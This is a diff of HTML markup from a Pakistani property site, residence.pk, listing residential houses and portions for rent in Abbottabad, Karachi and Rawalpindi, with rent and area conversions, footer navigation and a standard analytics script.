+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="http://www.residence.pk/Rentals/Abbottabad--residential-House-For-Rent-2211.htm"><img src="images/houseLogo.jpg" width="110" height="84" alt="House" name="House"/></a></td>
+                <td align="right" class="hdng1">House</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Rentals/Abbottabad--residential-House-For-Rent-2211.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Residential</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">500 - Marla <a href="#" onMouseOver="showContent(event, 'areaDivb3')" onMouseMove="moveContent(event, 'areaDivb3')" onMouseOut="hideContent('areaDivb3')" ><img src="images/info.gif" /></a>
+                <div id="areaDivb3" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>25</td><td> Kanal</td> </tr> <tr> <td>500</td> <td>Marla</td></tr><tr><td>11250</td><td> Sq.Feet</td></tr><tr><td>15125</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Abbottabad</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Rent</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 30000/-<a href="#" onMouseOver="showContent(event, 'priceDivb3')" onMouseMove="moveContent(event, 'priceDivb3')" onMouseOut="hideContent('priceDivb3')" > <img src="images/info.gif" /></a>
+                <div id="priceDivb3" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>285 GBP<br />350 USD<br />231 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div>
+                </td>
+                 
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWordsb3"></div><script>getCost('30000', 'costInWordsb3');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="http://www.residence.pk/Rentals/Abbottabad-Kakul Road-residential-Portion-For-Rent-2210.htm"><img src="images/portion.jpg" width="110" height="84" alt="Portion" name="Portion"/></a></td>
+                <td align="right" class="hdng1">Portion</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Rentals/Abbottabad-Kakul Road-residential-Portion-For-Rent-2210.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Residential</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">125 - Marla <a href="#" onMouseOver="showContent(event, 'areaDivb4')" onMouseMove="moveContent(event, 'areaDivb4')" onMouseOut="hideContent('areaDivb4')" ><img src="images/info.gif" /></a>
+                <div id="areaDivb4" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>6.25</td><td> Kanal</td> </tr> <tr> <td>125</td> <td>Marla</td></tr><tr><td>28125</td><td> Sq.Feet</td></tr><tr><td>3781.</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Abbottabad</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Rent</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 15000/-<a href="#" onMouseOver="showContent(event, 'priceDivb4')" onMouseMove="moveContent(event, 'priceDivb4')" onMouseOut="hideContent('priceDivb4')" > <img src="images/info.gif" /></a>
+                <div id="priceDivb4" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>142 GBP<br />175 USD<br />115 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div>
+                </td>
+                 
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWordsb4"></div><script>getCost('15000', 'costInWordsb4');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 </tr>
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="http://www.residence.pk/Rentals/Karachi-D.H.A-Residential-House-For-Rent-2215.htm"><img src="uploads_rent/2215_front.jpg.thumb.jpg" width="110" height="84" alt="House" name="House"/></a></td>
+                <td align="right" class="hdng1">House</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Rentals/Karachi-D.H.A-Residential-House-For-Rent-2215.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Residential</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">300 - Sq.Yards <a href="#" onMouseOver="showContent(event, 'areaDivb5')" onMouseMove="moveContent(event, 'areaDivb5')" onMouseOut="hideContent('areaDivb5')" ><img src="images/info.gif" /></a>
+                <div id="areaDivb5" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>0.49</td><td> Kanal</td> </tr> <tr> <td>9.91</td> <td>Marla</td></tr><tr><td>2231.</td><td> Sq.Feet</td></tr><tr><td>300</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Karachi</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Rent</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 150000/-<a href="#" onMouseOver="showContent(event, 'priceDivb5')" onMouseMove="moveContent(event, 'priceDivb5')" onMouseOut="hideContent('priceDivb5')" > <img src="images/info.gif" /></a>
+                <div id="priceDivb5" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>1428 GBP<br />1750 USD<br />1158 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div>
+                </td>
+                 
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWordsb5"></div><script>getCost('150000', 'costInWordsb5');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="http://www.residence.pk/Rentals/Abbottabad--residential-House-For-Rent-2214.htm"><img src="images/houseLogo.jpg" width="110" height="84" alt="House" name="House"/></a></td>
+                <td align="right" class="hdng1">House</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Rentals/Abbottabad--residential-House-For-Rent-2214.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Residential</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">15 - Marla <a href="#" onMouseOver="showContent(event, 'areaDivb6')" onMouseMove="moveContent(event, 'areaDivb6')" onMouseOut="hideContent('areaDivb6')" ><img src="images/info.gif" /></a>
+                <div id="areaDivb6" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>0.75</td><td> Kanal</td> </tr> <tr> <td>15</td> <td>Marla</td></tr><tr><td>3375</td><td> Sq.Feet</td></tr><tr><td>453.7</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Abbottabad</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Rent</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 25000/-<a href="#" onMouseOver="showContent(event, 'priceDivb6')" onMouseMove="moveContent(event, 'priceDivb6')" onMouseOut="hideContent('priceDivb6')" > <img src="images/info.gif" /></a>
+                <div id="priceDivb6" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>238 GBP<br />291 USD<br />193 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div>
+                </td>
+                 
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWordsb6"></div><script>getCost('25000', 'costInWordsb6');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 </tr>
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="http://www.residence.pk/Rentals/Abbottabad-Supply-residential-Portion-For-Rent-2213.htm"><img src="images/portion.jpg" width="110" height="84" alt="Portion" name="Portion"/></a></td>
+                <td align="right" class="hdng1">Portion</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Rentals/Abbottabad-Supply-residential-Portion-For-Rent-2213.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Residential</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">250 - Marla <a href="#" onMouseOver="showContent(event, 'areaDivb7')" onMouseMove="moveContent(event, 'areaDivb7')" onMouseOut="hideContent('areaDivb7')" ><img src="images/info.gif" /></a>
+                <div id="areaDivb7" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>12.5</td><td> Kanal</td> </tr> <tr> <td>250</td> <td>Marla</td></tr><tr><td>56250</td><td> Sq.Feet</td></tr><tr><td>7562.</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Abbottabad</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Rent</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 25000/-<a href="#" onMouseOver="showContent(event, 'priceDivb7')" onMouseMove="moveContent(event, 'priceDivb7')" onMouseOut="hideContent('priceDivb7')" > <img src="images/info.gif" /></a>
+                <div id="priceDivb7" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>238 GBP<br />291 USD<br />193 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div>
+                </td>
+                 
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWordsb7"></div><script>getCost('25000', 'costInWordsb7');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="http://www.residence.pk/Rentals/Rawalpindi-Airport Housing Society-Residential-House-For-Rent-2209.htm"><img src="uploads_rent/2209_front.jpg.thumb.jpg" width="110" height="84" alt="House" name="House"/></a></td>
+                <td align="right" class="hdng1">House</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Rentals/Rawalpindi-Airport Housing Society-Residential-House-For-Rent-2209.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Residential</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">5 - Marla <a href="#" onMouseOver="showContent(event, 'areaDivb8')" onMouseMove="moveContent(event, 'areaDivb8')" onMouseOut="hideContent('areaDivb8')" ><img src="images/info.gif" /></a>
+                <div id="areaDivb8" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>0.25</td><td> Kanal</td> </tr> <tr> <td>5</td> <td>Marla</td></tr><tr><td>1125</td><td> Sq.Feet</td></tr><tr><td>151.2</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rawalpindi</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Rent</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 15000/-<a href="#" onMouseOver="showContent(event, 'priceDivb8')" onMouseMove="moveContent(event, 'priceDivb8')" onMouseOut="hideContent('priceDivb8')" > <img src="images/info.gif" /></a>
+                <div id="priceDivb8" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>142 GBP<br />175 USD<br />115 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div>
+                </td>
+                 
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWordsb8"></div><script>getCost('15000', 'costInWordsb8');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 </tr>    </table>
+  </td>
+  </tr>   
+  
+ 
+<tr>
+  <td align="left" >&nbsp;&nbsp;<a title="Rent out my property" href="rent_property_pakistan.php">I want to rent out my property</a>
+  
+  </td>
+  <td align="right" ><a href="rent-property.php">Show All Property for Rent</a>&nbsp;&nbsp;</td>
+  </tr>
+</table>
+</td>
+
+<td class="contentContainer" width="160" valign="top" align="center">
+<p class="pTitle">Advertisements</p>
+<a href="http://www.motors.pk/" title="Used Cars in Pakistan"><img src="http://www.residence.pk/images/banner_motors_160x600.jpg" /></a></td></tr>
+
+</table> 
+    
+    
+
+<br />
+<table background="http://www.residence.pk/images/bgb.png" width="100%"  border="0" style="margin-bottom:0px">
+
+<tr>
+<td style="padding:20px; margin-bottom:0px">
+<table width="950" border="0" align="center" cellpadding="0" cellspacing="0">
+<tr>
+<td width="20%" class="text03" valign="top"><h4> Houses</h4><br />
+<a href="http://www.residence.pk/buy-property.php?city=Karachi&type=Residential&subType=House">Houses For Sale in Karachi</a><br />
+<a href="http://www.residence.pk/buy-property.php?city=Lahore&type=Residential&subType=House">Houses For Sale in Lahore</a><br />
+<a href="http://www.residence.pk/buy-property.php?city=Islamabad&type=Residential&subType=House">Houses For Sale in Islamabad</a><br />
+<a href="http://www.residence.pk/rent-property.php?city=Karachi&type=Residential&subType=House">Houses For Rent in Karachi</a><br />
+<a href="http://www.residence.pk/rent-property.php?city=Lahore&type=Residential&subType=House">Houses For Rent in Lahore</a><br />
+<a href="http://www.residence.pk/rent-property.php?city=Islamabad&type=Residential&subType=House">Houses For Rent in Islamabad</a>
+</td>
+<td width="20%" class="text03" valign="top"><h4>Apartments</h4><br />
+<a href="http://www.residence.pk/rent-property.php?city=Karachi&type=Residential&subType=Apartment">Apartments For Rent in Karachi</a><br />
+<a href="http://www.residence.pk/rent-property.php?city=Lahore&type=Residential&subType=Apartment">Apartments For Rent in Lahore</a><br />
+<a href="http://www.residence.pk/rent-property.php?city=Islamabad&type=Residential&subType=Apartment">Apartments For Rent in Islamabad</a><br />
+<a href="http://www.residence.pk/buy-property.php?city=Karachi&type=Residential&subType=Apartment">Apartments For Sale in Karachi</a><br />
+<a href="http://www.residence.pk/buy-property.php?city=Lahore&type=Residential&subType=Apartment">Apartments For Sale in Lahore</a><br />
+<a href="http://www.residence.pk/buy-property.php?city=Islamabad&type=Residential&subType=Apartment">Apartments For Sale in Islamabad</a></td>
+<td width="20%" class="text03" valign="top"><h4>Portions</h4><br />
+<a href="http://www.residence.pk/rent-property.php?city=Karachi&type=Residential&subType=Portion">Portions For Rent in Karachi</a><br />
+<a href="http://www.residence.pk/rent-property.php?city=Lahore&type=Residential&subType=Portion">Portions For Rent in Lahore</a><br />
+<a href="http://www.residence.pk/rent-property.php?city=Islamabad&type=Residential&subType=Portion">Portions For Rent in Islamabad</a><br />
+<a href="http://www.residence.pk/rent-property.php?city=Karachi&type=Residential&subType=Room">Rooms For Rent in Karachi</a><br />
+<a href="http://www.residence.pk/rent-property.php?city=Lahore&type=Residential&subType=Room">Rooms For Rent in Lahore</a><br />
+<a href="http://www.residence.pk/rent-property.php?city=Islamabad&type=Residential&subType=Room">Rooms For Rent in Islamabad</a>
+</td>
+<td width="20%" class="text03" valign="top"><h4>Offices</h4><br />
+  <a href="http://www.residence.pk/rent-property.php?city=Karachi&type=Commercial&subType=Office">Offices For Rent in Karachi</a><br />
+  <a href="http://www.residence.pk/rent-property.php?city=Lahore&type=Commercial&subType=Office">Offices For Rent in Lahore</a><br />
+ <a href="http://www.residence.pk/rent-property.php?city=Islamabad&type=Commercial&subType=Office">Offices For Rent in Islamabad</a><br />
+   <a href="http://www.residence.pk/buy-property.php?city=Karachi&type=Commercial&subType=Office">Offices For Sale in Karachi</a><br />
+  <a href="http://www.residence.pk/buy-property.php?city=Lahore&type=Commercial&subType=Office">Offices For Sale in Lahore</a><br />
+ <a href="http://www.residence.pk/buy-property.php?city=Islamabad&type=Commercial&subType=Office">Offices For Sale in Islamabad</a>
+  </td>
+<td width="20%" class="text03" valign="top"><h4>Plots</h4><br />
+ <a href="http://www.residence.pk/buy-property.php?city=Karachi&type=Residential&subType=Plot">Plots For Sale in Karachi</a><br />
+  <a href="http://www.residence.pk/buy-property.php?city=Lahore&type=Residential&subType=Plot">Plots For Sale in Lahore</a><br />
+ <a href="http://www.residence.pk/buy-property.php?city=Islamabad&type=Residential&subType=Plot">Plots For Sale in Islamabad</a><br />
+   <a href="http://www.residence.pk/buy-property.php?city=Peshawer&type=Residential&subType=Plot">Plots For Sale in Peshawar</a><br />
+ <a href="http://www.residence.pk/buy-property.php?city=Rawalpindi&type=Residential&subType=Plot">Plots For Sale in Rawalpindi</a><br />
+</td>
+
+
+</tr>
+
+    
+    
+</table>
+</td>
+</tr>
+</table>     <table bgcolor="#444444" width="100%"  border="0">
+
+<tr>
+<td style="padding:20px;">
+<!--<td background="http://www.residence.pk/images/bgb.png" style="padding:20px;">-->
+<table width="950" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td width="20%" valign="top" class="text03"><h3> Property in Pakistan</h3>
+      <br />
+      <a class="footermid" title="Property in Karachi" href="http://www.residence.pk/buy-property.php?city=Karachi">Property in Karachi</a><br />
+      <a class="footermid" title="Property in Lahore" href="http://www.residence.pk/buy-property.php?city=Lahore">Property in Lahore</a><br />
+      <a class="footermid" title="Property in Islamabad" href="http://www.residence.pk/buy-property.php?city=Islamabad">Property in Islamabad</a><br />
+      <a class="footermid" title="Property in Peshawar" href="http://www.residence.pk/buy-property.php?city=Peshawer">Property in Peshawar</a><br />
+      <a class="footermid" title="Property in Rawalpindi" href="http://www.residence.pk/buy-property.php?city=Rawalpindi">Property in Rawalpindi</a></td>
+    <td width="20%" valign="top" class="text03"><h3>Rentals in Pakistan</h3>
+      <br />
+      <a class="footermid" title="Real Estate in Karachi" href="http://www.residence.pk/rent-property.php?city=Karachi">For Rent in Karachi</a><br />
+      <a class="footermid" title="Real Estate in Lahore" href="http://www.residence.pk/rent-property.php?city=Lahore">For Rent in Lahore</a><br />
+      <a class="footermid" title="Real Estate in Islamabad" href="http://www.residence.pk/rent-property.php?city=Islamabad">For Rent in Islamabad</a><br />
+      <a class="footermid" title="Real Estate in Peshawar" href="http://www.residence.pk/rent-property.php?city=Peshawer">For Rent in Peshawar</a><br />
+      <a class="footermid" title="Real Estate in Rawalpindi" href="http://www.residence.pk/rent-property.php?city=Rawalpindi">For Rent in Rawalpindi</a></td>
+    <td width="20%" valign="top" class="text03"><h3>Property For Sale</h3>
+      <br />
+      <a class="footermid" href="http://www.residence.pk/buy-property.php?type=Residential&subType=House">Houses for Sale</a><br />
+      <a class="footermid" href="http://www.residence.pk/buy-property.php?type=Residential&subType=Apartment">Apartments for Sale</a><br />
+      <a class="footermid" href="http://www.residence.pk/buy-property.php?type=Residential&subType=Plot">Plots for Sale</a><br />
+      <a class="footermid" href="http://www.residence.pk/buy-property.php?type=Commercial&subType=Office">Offices for Sale</a><br />
+      <a class="footermid" href="http://www.residence.pk/buy-property.php?type=Commercial&subType=Shop">Shops for Sale</a></td>
+    <td width="20%" valign="top" class="text03"><h3>Property For Rent</h3>
+      <br />
+      <a class="footermid" href="http://www.residence.pk/rent-property.php?type=Residential&subType=House">Houses for Rent</a><br />
+      <a class="footermid" href="http://www.residence.pk/rent-property.php?type=Residential&subType=Apartment">Apartments for Rent</a><br />
+      <a class="footermid" href="http://www.residence.pk/rent-property.php?type=Residential&subType=Portion">Portions for Rent</a><br />
+      <a class="footermid" href="http://www.residence.pk/rent-property.php?type=Commercial&subType=Office">Offices for Rent</a><br />
+      <a class="footermid" href="http://www.residence.pk/rent-property.php?type=Commercial&subType=Shop">Shops for Rent</a></td>
+    <td width="15%" valign="top" class="text03"><h3>More links</h3>
+      <br />
+      <a class="footermid" href="http://www.residence.pk/rent_property_pakistan.php">Rent out Property</a><br />
+      <a class="footermid" href="http://www.residence.pk/sell_property_pakistan.php">Sell Property</a><br />
+      <a class="footermid" href="http://www.residence.pk/sitelinks.php">Site Links</a><br />
+      <a class="footermid" href="http://www.motors.pk">Buy and Sell Cars</a></td>
+  </tr>
+  <tr>
+    <td colspan="6" align="center"></td>
+  </tr>
+  <tr>
+    <td style="color:#CCC" height="33" colspan="4" align="center" valign="middle"><br />
+    Disclaimer: Residence.pk contains photos owned and posted by its users. Copyrighted photos are strictly prohibited. If you hold copyrights to any of the photo(s) here, please let us know at: admin @ residence.pk 
+<br />
+      Copyrights 2014 Residence.pk&nbsp;|&nbsp;<a rel="nofollow" href="http://www.residence.pk/about.php" class="footermid">About us</a>&nbsp;|&nbsp;<a rel="nofollow" href="http://www.residence.pk/contact.php" class="footermid">Contact us</a>&nbsp;|&nbsp;<a rel="nofollow" href="http://www.residence.pk/privacy.php" class="footermid">Privacy</a><br /></td>
+    <td width="5%" height="33" align="left" valign="middle" style="color:#CCC">
+    <div class="fb-like" data-href="https://www.facebook.com/residencepk" data-layout="button_count" data-action="like" data-show-faces="true" data-share="true"></div>&nbsp;
+    <a target="_blank"  rel="nofollow" title="Residence.pk RSS Feed" href="http://feeds.feedburner.com/ResidencepkRealEstateFeed"><img src="http://www.residence.pk/images/rss3.png" /></a>    
+    </td>
+  </tr>
+</table></td>
+</tr>
+</table>
+      <script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-9657450-13']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
